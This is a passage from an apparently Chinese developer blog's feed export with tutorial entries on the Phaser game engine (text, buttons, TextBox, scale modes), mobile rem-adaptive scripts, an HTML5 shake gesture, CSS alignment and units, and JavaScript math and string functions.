text.height);//渐变的两个色值grd.addColorStop(0, '#8ED6FF'); grd.addColorStop(1, '#004CB3');text.fill = grd;21. ​文本行距text.lineSpacing = 40;22. ​文本边距text.padding = 40;23. ​文本倒影样式制作出文本的倒影24. ​文本分辨率设置text.resolution = 1;25. ​文本描边123text.stroke = "#de77ea"; text.strokeThinckness = 16;​text.addstrokeColor("#de77ea", 30)​26. ​文本tab对齐text.tabs = 123;“Armor \t spell”​ \t来表示tab键可以用数组来分别设置tab距离：tabs:[143, 234, 50]​headings = [‘Name’, ‘Damage’, ‘Speed’, ‘Notes’]​text.parseList(headings)​27. ​文本颜色填充1text.tint = (item.tint === 0xffffff) ? 0xff0000 : 0xffffff;28. ​文本使用物理引擎29. ​文本内容设置text.setText(“string”);30. ​文本自动换行1234567style = &#123;font: 'bold 60pt Arial',fill: 'white',align: 'left',wordWrap: true,wordWrapWidth: 450&#125;;注：换行设置对中文无效…​]]></content>
      <categories>
        <category>Phaser</category>
      </categories>
      <tags>
        <tag>Phaser中的text</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Phaser官方示例教程整理—Buttons(按钮)]]></title>
    <url>%2F2015%2F09%2F21%2Fphaser%E5%AE%98%E6%96%B9%E7%A4%BA%E4%BE%8B%E6%95%99%E7%A8%8B%E6%95%B4%E7%90%86-buttons%E6%8C%89%E9%92%AE%2F</url>
    <content type="text"><![CDATA[官方教程示例 http://phaser.io/examples按钮 Buttons1. 点击事件添加按钮 button = game.add.button(X, Y, ‘按钮图片名’, 函数名, this, 2, 1, 0);最后的2，1，0是针对按钮悬停、离开、按下三种状态（还有一种弹起状态）的背景图片ID标识，也可以用文本进行命名图片​鼠标悬停 button.onInputOver.add(over, this);鼠标离开 button.onInputOut.add(out, this);按钮弹起 button.onInputUp.add(up, this);以上三种响应事件中的over/out/up均为函数名&nbsp;2. 加入群组按钮加入到群组中的方式与其他元素没什么区别，创建群组之后再加入按钮即可12group = game.add.group();​group.add(button);​&nbsp;3. 按钮属性主要是示范了如何调整按钮的角度、​固定宽高、缩放角度：button.angle = 32固定宽高：button.width(height) = 300按比例缩放（1为原始比例）：button.scale.setTo(0.5, 0.5)​；&nbsp;4. 按钮背景变化（图集）​根据按钮不同状态（按下、悬停等）改变按钮的背景图片，首先需要准备好图集资源（集合了多张按钮背景的图片）​，然后在生成按钮时标注上不同状态对应的图片名称1button = game.add.button(x, y, 'button', actionOnClick, this, 'over', 'out', 'down');&nbsp;5. ​按钮的取消功能​示例中主要的意思是实现了一个带有取消功能的按钮，特别之处在于如果鼠标点击这个取消按钮之后，然后又将鼠标移出按钮之后再放开，将认为用户后悔了，不想再进行取消。​主要实现步骤是在回调函数中添加对鼠标行为的监视：123456function onUp(button, pointer, isOver) &#123; if (isOver) &#123; background.visible =! background.visible; &#125;&#125;&nbsp;​6. 改变按钮背景可以通过button.setFrames(0,1,2,3)来重新设定按钮不同状态的背景图片&nbsp;7. 按钮旋转主要是展示了，即时按钮在旋转状态也是可以点击的，旋转的实现方法是在update()保留函数中实时增加button.angle的值在按钮的教程中，用到了spritesheet和​atlas两种方式来加载按钮背景图片。一般来看，固定宽高的图片用spritesheet更加方便，而atlas更加灵活也稍微麻烦一些。]]></content>
      <categories>
        <category>Phaser</category>
      </categories>
      <tags>
        <tag>phaser中的buttons</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在IIS中配置Phaser的examples站点]]></title>
    <url>%2F2015%2F09%2F21%2F%E5%9C%A8iis%E4%B8%AD%E9%85%8D%E7%BD%AEphaser%E7%9A%84examples%E7%AB%99%E7%82%B9%2F</url>
    <content type="text"><![CDATA[phaser是HTML5开源的游戏引擎。一、源码下载地址：https://github.com/photonstorm/phaser二、文档结构：三、将phaser-master部署到IIS中站点中，如果这是直接浏览站点则会出现报错四、原因是没有配置充当静态文件的扩展名，需要在IIS功能视图中的“MIME类型”中添加”.json”扩展名。这时打开站点，就能正确显示网站了。]]></content>
      <categories>
        <category>Phaser</category>
      </categories>
      <tags>
        <tag>phaser配置examples站点</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Phaser中TextBox的运用]]></title>
    <url>%2F2015%2F09%2F21%2Fphaser%E4%B8%ADtextbox%E7%9A%84%E8%BF%90%E7%94%A8%2F</url>
    <content type="text"><![CDATA[使用Phaser有一段时间的,越来越喜欢这个游戏引擎，但是它不像egret那样有专业的公司和团队去维护，并提供大量的工具，所以Phaser没有那么多的工具，但是真的很好用。在做游戏登录界面的时候，发现Phaser没有提供TextBox的控件，在官方的论坛进行搜索以后得到了如下的结论大部分的情况都是采用DOM的方式来去实现textbox。本文采用DOM的方式实现了可以自适应Phaser画布的TextBox，效果图如下：2.创建一个名为HtmlTextBox.js的js文件3.在该文件中定义functionHtmlTextBox(game,x,y,width,height,text,style)，作为使用类4.实现主要内容12345678this.game = game;this.parentElement = game.canvas.parentNode;//创建一个inputElementthis.textBoxElement = document.createElement('input');this.textBoxElement.style.position = 'absolute';this.textBoxElement.style.left = x+'px';this.textBoxElement.style.top = y+'px';this.textBoxElement.style.width = width;this.textBoxElement.style.height = height;this.parentElement.insertBefore(this.textBoxElement,game.canvas);上述代码添加了一个html的input。5.自适应屏幕上述代码实现了update的时候，根据新的位置计算dom的位置和大小，从而自动适应了屏幕大小。//更新函数，用来重新计算TextBox的位置1234567891011121314151617181920212223242526272829303132333435HtmlTextBox.prototype.update = function()&#123; var canvas = this.game.canvas; var canvasX = canvas.offsetLeft; var canvasY = canvas.offsetTop; var canvasWidth = canvas.offsetWidth; var canvasHeight = canvas.offsetHeight; if(this.oldCanvasWidth == canvasWidth &amp;amp;&amp;amp; this.oldCanvasHeight == canvasHeight &amp;amp;&amp;amp; this.oldCanvasX == canvasX &amp;amp;&amp;amp; this.oldCanvasY == canvasY)return; var gameWidth = this.game.world.width; var gameHeight = this.game.world.height; var widthScanle = canvasWidth/gameWidth; var heightScanle = canvasHeight/gameHeight; var xScanle = this._x/gameWidth; var yScanle = this._y/gameHeight; var newX = canvasX + canvasWidth * xScanle; var newY = canvasY + canvasHeight * yScanle; var newWidth = this._width * widthScanle; var newHeight = this._height * heightScanle; this.setX(newX); this.setY(newY); this.setWidth(newWidth); this.setHeight(newHeight); this.oldCanvasWidth = canvasWidth; this.oldCanvasHeight = canvasHeight; this.oldCanvasX = canvasX; this.oldCanvasY = canvasY;&#125;最后附上这个TextBox的完整的源码。HtmlTextBox.js]]></content>
      <categories>
        <category>Phaser</category>
      </categories>
      <tags>
        <tag>phaser TextBox</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[手机端页面rem自适应脚本]]></title>
    <url>%2F2015%2F09%2F21%2F%E6%89%8B%E6%9C%BA%E7%AB%AF%E9%A1%B5%E9%9D%A2rem%E8%87%AA%E9%80%82%E5%BA%94%E8%84%9A%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[什么是rem&emsp;&emsp;rem就是1rem单位就等于html节点fontsize的像素值。所以改变html节点的fontsize是最为关键的一步。根据手机宽度改变相对大小就可以实现自适应了，就不用什么媒体查询那些的。&emsp;&emsp;我们的设计图往往宽度是640或者其他尺寸的，不过我建议是用这个尺寸，以640为基准，以小到大，实现自适应，下面实现的比例为1rem=40px(640宽度)。为什么这样搞？&emsp;&emsp;这样一套代码就搞定手机端尺寸自适应，不需要媒体查询，而且利用Sass和Less能够给我们节约更多的时间，以及更好的体验。扩展&emsp;&emsp;因为是要计算rem的值，所以我们前端在看到设计图量尺寸的时候会去计算下这个东西，需要花费一些时间，所以我提供了Sass（不知道的自己去百度）和Less（不知道的自己去百度）相对变量的代码，Sass相对变量地址：Sass相对变量Less相对变量地址：Less相对变量&emsp;&emsp;打开页面，1-400的相对变量都在上面，只需要全选复制，然后放入你的项目中，直接拿来用就是了，当然我写的css雪碧图生成工具也会用到里面的变量，大家不妨一试。手机自适应代码&emsp;&emsp;下面的代码是拷贝自淘宝的手机app，当然，我把有的变量还原了，有的注释了。直接引用这个js，不需要设计viewport标签12345678910111213141516171819202122232425262728293031323334353637383940414243444546!function(win) &#123; function resize() &#123; var domWidth = domEle.getBoundingClientRect().width; if(domWidth / v &gt; 540)&#123; domWidth = 540 * v; &#125; win.rem = domWidth / 16; domEle.style.fontSize = win.rem + "px"; &#125; var v, initial_scale, timeCode, dom = win.document, domEle = dom.documentElement, viewport = dom.querySelector('meta[name="viewport"]'), flexible = dom.querySelector('meta[name="flexible"]'); if (viewport) &#123; var o = viewport.getAttribute("content").match(/initial\-scale=(["']?)([\d\.]+)\1?/); if(o)&#123; initial_scale = parseFloat(o[2]); v = parseInt(1 / initial_scale); &#125; &#125; else if(flexible) &#123; var o = flexible.getAttribute("content").match(/initial\-dpr=(["']?)([\d\.]+)\1?/); if (o) &#123; v = parseFloat(o[2]); initial_scale = parseFloat((1 / v).toFixed(2)) &#125; &#125; if (!v &amp;&amp; !initial_scale) &#123; var n = (win.navigator.appVersion.match(/android/gi), win.navigator.appVersion.match(/iphone/gi)); v = win.devicePixelRatio; v = n ? v &gt;= 3 ? 3 : v &gt;= 2 ? 2 : 1 : 1, initial_scale = 1 / v &#125; //没有viewport标签的情况下 if (domEle.setAttribute("data-dpr", v), !viewport) &#123; if (viewport = dom.createElement("meta"), viewport.setAttribute("name", "viewport"), viewport.setAttribute("content", "initial-scale=" + initial_scale + ", maximum-scale=" + initial_scale + ", minimum-scale=" + initial_scale + ", user-scalable=no"), domEle.firstElementChild) &#123; domEle.firstElementChild.appendChild(viewport) &#125; else &#123; var m = dom.createElement("div"); m.appendChild(viewport), dom.write(m.innerHTML) &#125; &#125; win.dpr = v; win.addEventListener("resize", function() &#123; clearTimeout(timeCode), timeCode = setTimeout(resize, 300) &#125;, false); win.addEventListener("pageshow", function(b) &#123; b.persisted &amp;&amp; (clearTimeout(timeCode), timeCode = setTimeout(resize, 300)) &#125;, false); resize();&#125;(window);&nbsp;&emsp;&emsp;执行完代码后你的页面就会跟随手机的宽度而自适应了，根本就不用什么媒体查询那些，很简洁，很使用，站在巨人的肩膀上吧这就叫做！]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>rem自适应脚本</tag>
        <tag>移动端自适应脚本</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[html5实现微信摇一摇功能]]></title>
    <url>%2F2015%2F09%2F18%2Fhtml5%E5%AE%9E%E7%8E%B0%E5%BE%AE%E4%BF%A1%E6%91%87%E4%B8%80%E6%91%87%E5%8A%9F%E8%83%BD%2F</url>
    <content type="text"><![CDATA[在HTML5中，DeviceOrientation特性所提供的DeviceMotion事件封装了设备的运动传感器时间，通过改时间可以获取设备的运动状态、加速度等数据（另还有deviceOrientation事件提供了设备角度、朝向等信息）。而通过DeviceMotion对设备运动状态的判断，则可以帮助我们在网页上就实现“摇一摇”的交互效果。运动事件监听12345if (window.DeviceMotionEvent) &#123;window.addEventListener('devicemotion', deviceMotionHandler, false);&#125; else &#123;alert('你的手机太差了，买个新的吧。');&#125;获取加速度信息“摇一摇”的动作既“一定时间内设备了一定距离”，因此通过监听上一步获取到的x, y, z 值在一定时间范围内的变化率，即可进行设备是否有进行晃动的判断。而为了防止正常移动的误判，需要给该变化率设置一个合适的临界值。123456789101112131415161718192021function deviceMotionHandler(eventData) &#123;var acceleration = eventData.accelerationIncludingGravity;var curTime = new Date().getTime();if ((curTime - last_update) &gt; 100) &#123;var diffTime = curTime - last_update;last_update = curTime;x = acceleration.x;y = acceleration.y;z = acceleration.z;var speed = Math.abs(x + y + z - last_x - last_y - last_z) / diffTime * 10000;var status = document.getElementById("status");if (speed &gt; SHAKE_THRESHOLD) &#123;doResult();&#125;last_x = x;last_y = y;last_z = z;&#125;&#125;效果如图所示：]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>html5 微信摇一摇</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS实现两端对齐]]></title>
    <url>%2F2015%2F09%2F18%2Fcss%E5%AE%9E%E7%8E%B0%E4%B8%A4%E7%AB%AF%E5%AF%B9%E9%BD%90%2F</url>
    <content type="text"><![CDATA[方法一：使用text-align:justifytext-align:justify属性是全兼容的，使用它实现两端对齐，需要注意在模块之间添加[空格/换行符/制表符]才能起作用，同样，实现文本对齐也是需要在字与字之间添加[空格/换行符/制表符]才能起作用说明：1.IE中要实现块内单行两端对齐需要使用其私有属性text-align-last:justify配合，text-align-last 要生效，必须先定义text-align 为justify2.line-height:0 解决标准浏览器容器底部多余的空白1234567891011.content&#123; text-align:justify; text-align-last:justify; line-height:0; height:44px;&#125;说明：模块使用[换行符]或[空格符]后，webkit浏览器中会引起最后一个模块有多余空白，使用font-size:0可清除该空格123456789@media all and (-webkit-min-device-pixel-ratio:0)&#123;.content&#123; font-size:0;&#125;&#125;说明：1.text-align-last:justify 目前只有IE支持，标准浏览器需要使用 .demo:after 伪类模拟类似效果2.opera浏览器需要添加 vertical-align:top 才能完全解决底部多余的空白123456789101112131415.content:after&#123; display:inline-block; overflow:hidden; width:100%; height:0; content:''; vertical-align:top;&#125;且子类必须是 inline-block 元素方法二：使用box-pack:justify父类容器css:12345678910111213141516171819.content&#123; display:-webkit-box; display:-webkit-flex; display:-ms-flexbox; display:flex; -webkit-box-pack:justify; -webkit-justify-content:space-between; -ms-flex-pack:justify; justify-content:space-between;&#125;且子类必须是 block 元素方法三：使用column(多列布局)说明：1.column-count定义了对象的列数2.column-gap定义了对象中列与列的间距父类容器css:123456789101112131415.content &#123; -webkit-column-count: 2; -moz-column-count: 4; column-count: 4; -webkit-column-gap: 20px; -moz-column-gap: 20px; column-gap: 20px;&#125;且子类必须是 block 元素]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>css实现两端对齐</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery多步骤进度条、网页步骤流程进度条插件]]></title>
    <url>%2F2015%2F09%2F18%2Fjquery%E5%A4%9A%E6%AD%A5%E9%AA%A4%E8%BF%9B%E5%BA%A6%E6%9D%A1%E3%80%81%E7%BD%91%E9%A1%B5%E6%AD%A5%E9%AA%A4%E6%B5%81%E7%A8%8B%E8%BF%9B%E5%BA%A6%E6%9D%A1%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[效果图：查看演示1查看演示2点击下载&nbsp;&nbsp;]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>多步骤进度条</tag>
        <tag>网页步骤流程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Javascript算术运算函数]]></title>
    <url>%2F2015%2F09%2F18%2Fjavascript%E7%AE%97%E6%9C%AF%E8%BF%90%E7%AE%97%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[一、数学函数的使用Math.pow(2,53) =&gt;2的53次幂Math.round(.6) =&gt;四舍五入Math.ceil(.6) =&gt;向上求整Math.floor(.6) =&gt;向下求整Math.abs(-5) =&gt;求绝对值Math.max(x,y,z) =&gt;返回最大值Math.min(x,y,z) =&gt;返回最小值Math.random() =&gt;生成一个大于等于0小于1.0的伪随机数Math.PI =&gt;圆周率Math.E =&gt;自然对数的底数Math.sqrt(3) =&gt;3的平方根Math.pow(3,1/3) =&gt;3的立方根Math.sin(0) =&gt;三角函数：还有Math.cos,Math.atan等Math.log(10) =&gt;10的自然对数Math.log(100)/Math.LN10 =&gt;以10为底100的对数Math.log(512)/Math.LN2 =&gt;以2为底数512的对数Math.exp(3) =&gt;e的三次幂二、字符串的使用var s=”hellow,world” //定义一个字符串s.charAt(0) // =&gt;”h”: 第一个字符s.charAt(s.length-1) // =&gt; “d”: 最后一个字符s.substring(1,4) // =&gt; “ell”:第2~4个字符s.slice(1,4) // =&gt;”ell”:同上s.slice(-3) // =&gt;”rld”:最后三个字符s.indexOf(“1”) // =&gt;2:字符1首次出现的位置s.lastIndexOf(“1”) // =&gt;10:字符最后一次出现的位置s.indexOf(“1”,3) // =&gt;3:在位置3及之后首次出现字符1的位置s.split(“,”) // =&gt;[“hello”,”world”]分割成子串s.replace(“h”,”H”) // =&gt;”Hello,world”:全文字符替换s.toUpperCase() // =”HELLO,WORLD”]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js算术函数</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS中常用的字体单位：px、em、rem和%的区别]]></title>
    <url>%2F2015%2F09%2F18%2Fcss%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E5%AD%97%E4%BD%93%E5%8D%95%E4%BD%8D%EF%BC%9Apx%E3%80%81em%E3%80%81rem%E5%92%8C%E7%9A%84%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"><![CDATA[在刚接触CSS时，px用的比较多，也很好理解，可是用久了就会发现有些缺陷，特别是在做响应式开发的时候。那这么多单位到底在什么时候用什么单位合适呢？今天就来探讨一下。先大致解释一下这些单位的意思：1、pxpx单位名称为像素，像素是固定大小的单元,用于屏幕媒体(即在电脑屏幕上读取)。一个像素等于电脑屏幕上的一个点 (是你屏幕分辨率的最小分割)。许多网页设计师在web文档使用像素单位以生产浏览器渲染的像素完美呈现的网站。像素单元的一个问题是,它没有为视障读者的扩展,以适应移动设备。2、emem单位名称为相对长度单位。相对于当前对象内文本的字体尺寸，如当前对行内文本的字体尺寸未被人为设置，则相对于浏览器的默认字体尺寸，国外使用比较多；em单位有如下特点1. em的值并不是固定的;2. em会继承父级元素的字体大小。我们在写CSS的时候如果要用em为单位，需要注意以下几点：1. body选择器中声明Font-size=62.5%;2. 将你的原来的px数值除以10，然后换上em作为单位;3. 重新计算那些被放大的字体的em数值。避免字体大小的重复声明。我们知道任意浏览器的默认字体高都是16px。所有未经调整的浏览器都符合: 1em=16px。那么12px=0.75em,10px=0.625em。为了简化font-size的换算，需要在css中的body选择器中声明Font-size=62.5%，这就使em值变为 16px*62.5%=10px, 这样12px=1.2em, 10px=1em, 也就是说只需要将你的原来的px数值除以10，然后换上em作为单位就行了。em是继承父元素的字体大小，可是当父元素字体大小改变时，又得重新计算了，这不怎么方便，还好rem解决了这个问题3、remrem是CSS3新增的一个相对长度单位，只相对根目录即HTML元素所以我们只要在html标签上设置字体大小为标准，文档中的字体大小都会以此为参照12345html&#123;font-size:62.5%; /* 10÷16=62.5% */&#125;body&#123;font-size:12px;font-size:1.2rem ; /* 12÷10=1.2 */&#125;p&#123;font-size:14px;font-size:1.4rem;&#125;兼容性：IE9+，Firefox、Chrome、Safari、Opera 的主流版本都支持，为了兼容不支持 rem 的浏览器，我们需要在 rem 前面写上对应的 px 值，这样不支持的浏览器可以优雅降级。4、%百分比单位更像“em”单位,除了一些根本性的差异。首先,当前的字体大小等于100%(比如12 pt = 100%)。当使用百分比单位,你的文字在移动设备上仍然保持完全的可伸缩性和可访问性。一般来说,1 em = 16 px = 100%个人总结：在一般的PC端网页制作过程中，px和em用的比较多，在移动端一般采用rem。]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>em</tag>
        <tag>px</tag>
        <tag>rem和%的区别</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Phaser中必须知道的7个函数]]></title>
    <url>%2F2015%2F09%2F17%2Fphaser%E4%B8%AD%E5%BF%85%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%847%E4%B8%AA%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[Phaser有很多能在游戏特定阶段执行的函数，分别用来保存特定代码：preload这是整个游戏最先执行的函数，可以用来加载游戏所需的资源，例如：game.load.image()等等。注意：当此函数执行时，游戏并不会执行update和render函数，取而代之的是2个特殊的函数(如果它们存在的话)：loadUpdate and loadRender.preload的功能并不只是加载资源，它还可以用来初始化整个游戏世界，比如设置canvas背景颜色，游戏屏幕适配模式。无论如何都要保证代码条理清晰，否则，我只能建议你只做加载资源的事。这个函数是自动加载的，不需要调用。loadUpdate如上文所说，这个函数只在加载资源的时候被调用，可以用来设置游戏的加载进度条(Phaser提供了更简单的方法，具体可以参考Phaser游戏开发教程-Monster-Wants-Candy).loadRender这个函数不是必须的，在游戏开发过程一般不会调用。（尤其不适合WebGL的游戏）createpreload执行完成后自动调用此函数(create), 同样的，如果你不需要加载资源或者没有preload函数，create就是Phaser第一个调用的函数，在create函数里可以用来创建精灵(sprite),粒子(particles)和任何你需要的使用preload加载的资源，整个游戏的大部分代码都将在这里完成，创建游戏对象等等…update这个函数对于游戏开发者来说一定不陌生，游戏的每一帧都会调用它，每秒60帧，通过它你可以完成Input的监听，碰撞检测等等，这是整个游戏的核心。render此函数在WebGL/canvas渲染之后执行，一般用来抓取Debug信息。例如：当我开始开发一个游戏时，把游戏渲染模式切换到canvas，使用render函数去绘制debug信息在游戏上方。一旦每帧的渲染完成，就会又一次回到update函数。resize这个函数在Phaser2.1.0版本中介绍过，只有在游戏改变适配模式的时候调用，有两个变量，新的游戏width和height。shutdownstate被关闭是调用(比如切换state时)。在游戏中我们不能使用以上的函数名，就像不能使用系统的保留关键字一样。以上的方法都属于Phaser的State对象，包含一组默认的属性：1234567891011121314151617181920212223242526272829303132333435/*** @property &#123;Phaser.Game&#125; game - This is a reference to the currently running Game.*/this.game = null;/*** @property &#123;Phaser.GameObjectFactory&#125; add - A reference to the GameObjectFactory which can be used to add new objects to the World.*/this.add = null;/*** @property &#123;Phaser.GameObjectCreator&#125; make - A reference to the GameObjectCreator which can be used to make new objects.*/this.make = null;/*** @property &#123;Phaser.Camera&#125; camera - A handy reference to World.camera.*/this.camera = null;/*** @property &#123;Phaser.Cache&#125; cache - A reference to the game cache which contains any loaded or generated assets, such as images, sound and more.*/this.cache = null;/*** @property &#123;Phaser.Input&#125; input - A reference to the Input Manager.*/this.input = null;/*** @property &#123;Phaser.Loader&#125; load - A reference to the Loader, which you mostly use in the preload method of your state to load external assets.*/this.load = null;/*** @property &#123;Phaser.Math&#125; math - A reference to Math class with lots of helpful functions.*/this.math = null;/*** @property &#123;Phaser.SoundManager&#125; sound - A reference to the Sound Manager which can create, play and stop sounds, as well as adjust global volume.*/this.sound = null;/*** @property &#123;Phaser.ScaleManager&#125; scale - A reference to the Scale Manager which controls the way the game scales on different displays.*/this.scale = null;/*** @property &#123;Phaser.Stage&#125; stage - A reference to the Stage.*/this.stage = null;/*** @property &#123;Phaser.Time&#125; time - A reference to the game clock and timed events system.*/this.time = null;/*** @property &#123;Phaser.TweenManager&#125; tweens - A reference to the tween manager.*/this.tweens = null;/*** @property &#123;Phaser.World&#125; world - A reference to the game world. All objects live in the Game World and its size is not bound by the display resolution.*/this.world = null;/*** @property &#123;Phaser.Particles&#125; particles - The Particle Manager. It is called during the core gameloop and updates any Particle Emitters it has created.*/this.particles = null;/*** @property &#123;Phaser.Physics&#125; physics - A reference to the physics manager which looks after the different physics systems available within Phaser.*/this.physics = null;/*** @property &#123;Phaser.RandomDataGenerator&#125; rnd - A reference to the seeded and repeatable random data generator.*/this.rnd = null;再次提醒：以上都是phaser保留字段，如果你喜欢，你可以重写或者替换它们，但不太容易哦。]]></content>
      <categories>
        <category>Phaser</category>
      </categories>
      <tags>
        <tag>phaser函数</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Phaser游戏开发之屏幕适配策略]]></title>
    <url>%2F2015%2F09%2F17%2Fphaser%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%91%E4%B9%8B%E5%B1%8F%E5%B9%95%E9%80%82%E9%85%8D%E7%AD%96%E7%95%A5%2F</url>
    <content type="text"><![CDATA[序言（Welcome）现在的HTML5游戏都要具备一种功能，不管在哪一种设备上运行，都应该适应它的分辨率，为此Phaser内置了一个屏幕适配管理对象(Scale Manager)。本片教程就涵盖了此管理对象的方方面面，包括各种适配模式及其属性。（注意：本教程基于Phaser2.2.0以上版本）为你的戏选择一个分辨率(Picking a resolution for your game)不管你使用哪一种适配模式，也不管你是否决定去创建一个能在任何设备上都全屏的完全响应式游戏，你都需要先定下一个基本的分辨率。在这个分辨率里会创建所有游戏需要的资源，也会创建游戏视图，还要计划按钮和其他基本元素的位置，对齐方式。选择一个正确的分辨率不是一件太容易的事，原因是它很大程度上取决你要制作的游戏的类型和目标受众。你可以参考以下内容以便于做出决定：性能（Performance）关于游戏性能您是怎么想的？很明显每个人都希望自己的游戏运行的很顺畅，但是不同类型的游戏有不同的处理方法，而本质上都是关于游戏每帧需要移动的像素的数量。如果你正制作一个match-3类型的游戏，那么大部分时间游戏屏幕是不会变化的，但也许有下落的宝石，动画，和粒子等等，但很明显正在移动的像素数量实际上在任何时候都很少。相较于这没有尽头的酷跑类游戏，它有一个不断滚动的背景，可能它上方还有个视觉层目标受众(Target Audience)记住你的游戏是为谁而作。跨平台性(Cross Platform?)PC端屏幕大，不用担心显示问题，可以使用高清资源，移动端则反之。预算(Budgets)基于预算可做两套不同的资源（分别用于SD和HD或者“移动端”和“PC端”），游戏启动时检测屏幕大小，进而选择合适的资源加载。若预算不足，也无需如此，一套资源足以。带宽(Bandwidth)游戏复杂，动画过多，需要加载的资源就多，需要的带宽就要大，否则加载时间就会很长，影响用户体验。竖屏 横屏?(Portrait or Landscape)竖屏还是横屏，对应的分辨率自然是不同的，游戏是用竖屏还是竖屏，必须要进行需求分析并深思熟虑再下决定，然后经过最终测试。上面几点都是我们选择游戏基础分辨率的参考条件，下面让我们一起来探索Phaser游戏的缩放方式吧。适配的概念(Scaling Concepts)在文章开始之前需要介绍几个名词，Phaser中都是通过“the Game”，“the World”，和“the Parent”来进行元素缩放的。Game Size固定模式(Fixed Dimensions)在Phaser游戏引擎有一个名词“Game Size”，在Game构造函数中用像素值来定义游戏的长宽，例如下面的代码就是设置游戏的大小为640 x 480像素:1var game = new Phaser.Game(640, 480, Phaser.AUTO, 'container');Phaser则会在定义的尺寸下创建Canvas对象。百分比模式(Percentage based Dimensions)除了使用整数也可以使用百分比来定义游戏大小，如下：1var game = new Phaser.Game('100%', '100%', Phaser.AUTO, 'container');在这里Phaser游戏大小被设置成container元素可用的宽和高（这里的container被称作the Game Parent）,如果没有设置container元素，Phaser引擎会自动将页面body标签作为the Game Parent。游戏大小则是当前浏览器窗口大小。（值得注意的是：改变浏览器窗口大小，游戏窗口不会自动跟随改变）world size有Phaser game对象的存在就有The Game World（游戏世界）存在，当你创建一个新的sprite时，它就会被添加到The World 并活在其中。The World的大小是可以改变的，通过Phaser camera我们可以查看到The World的一部分。The World默认大小则是我们定义的game的大小，通过下面的代码改变其大小：1000);```12345678执行上述代码，The World大小会被重设成2000x1000像素。如果我们设置的游戏初始值是640x480像素的话，那么我们看到的将是整个游戏世界的左上角。通过改变camera.x 和camera.y 移动查看游戏世界其他位置。Sprites和其他游戏对象可以在这个世界2000x1000像素区域的任何位置。当游戏视角移动到他们的位置或者它们移动到游戏视觉的时候，他们才会被绘制。（The World是一个虚拟尺寸，和实际的游戏现实大小无关，这一点在sprites缩放时尤为重要。）父容器(Parent Container)在web浏览器创建一个Phaser游戏时，通常都是需要一个父容器的，这个Phaser game构造函数的规则：```var game = new Phaser.Game(640, 480, Phaser.AUTO, &apos;myDiv&apos;);上面的代码可以解释为，游戏开始时会在myDiv容器里创建一个Canvas DOM元素，在本例中这个Canvas的大小是640x480像素。任何CSS设置都可通过myDiv控制布局。例如：设置myDiv的宽500px，并且overflow：none，那么我们就不能看到游戏右面的140px，这部分被切除了。同样你的如果没有对myDiv设置CSS，myDiv就会自动适配Canvas大小。记住：myDiv的控制权是你的CSS而不是PHASER。如果myDiv不存在，或为空，Phaser会选择浏览器的窗口（body元素）作为父容器（如果你不选择一个父容器，那代码如下）game = new Phaser.Game(640, 480, Phaser.AUTO, '');```12345678910111213Phaser将浏览器窗口作为父容器，创建了Canvas 元素，并添加到body里，如果当前页面已有内容，那么Canvas将会添加到这些内容的后面。The Game Parent 就是用来容纳Phaser Canvas并管理所有缩放的浏览器窗口或者一个DOM元素，我们称之为game&apos;s parent container，简称：“the&apos; parent”。**设置Phaser适配模式(Setting a Phaser Scale Mode)**你可以在游戏代码任何位置设置游戏的适配模式，但我们强烈建议只做一次设置，之后不再改变。这样做最好的地方就在init方法。下面的代码就是在设置Phaser默认的适配模式中的一种，并且游戏在父容器下左右上下居中。```javascriptfunction init() &#123; game.scale.scaleMode = Phaser.ScaleManager.NO_SCALE; game.scale.pageAlignVertically = true; game.scale.pageAlignHorizontally = true;&#125;任何缩放操作都是直接由Phaser Scale Manager来管理，如果有一个全局变量game，你可以通过game.scale来操作，就像上面的代码一样。但如果你正在使用Phaser states，那就应该在Boot state文件里添加下面的代码替代上面的：12345init: function () &#123; this.scale.scaleMode = Phaser.ScaleManager.NO_SCALE; this.scale.pageAlignVertically = true; this.scale.pageAlignHorizontally = true;&#125;scale是Phaser state的常用属性，也可以通过game直接引用。在本文中我们的示例代码会一直使用全局变量game，但你可以通过上面方法替换代码风格并且效果是一样的。缩放模式一： EXACT_FIT12game.scale.scaleMode =Phaser.ScaleManager.EXACT_FIT;The Exact Fit缩放模式是一个特殊的模式，它将游戏的大小重设成适合父容器的大小，而且并不会保持游戏的宽高比例。也就是意味着当the parent的大小和游戏的不一样时，游戏将会随之缩放，就像下图：可以看到，当浏览器又宽又短时图像是很扭曲的。缩放模式二： NO_SCALE1game.scale.scaleMode = Phaser.ScaleManager.NO_SCALE;这是默认的适配模式，通过模式的名称就能够知道，实际上它什么都没做，游戏大小就是你在game构造函数定义的大小，不会有任何改变。它和EXACT_FIT不同的地方在于不管父容器如何改变，NO_SCALE都不会扭曲游戏图像。上图中黑色的区域就是网页其他部分，游戏大小800x600像素，在左上角。让我们再来看看当父容器变小时，会发生什么（如下图）：注意：你依然能够通过CSS来改变Canvas大小，但在Phaser缩放模式下是不起作用的。缩放模式三： 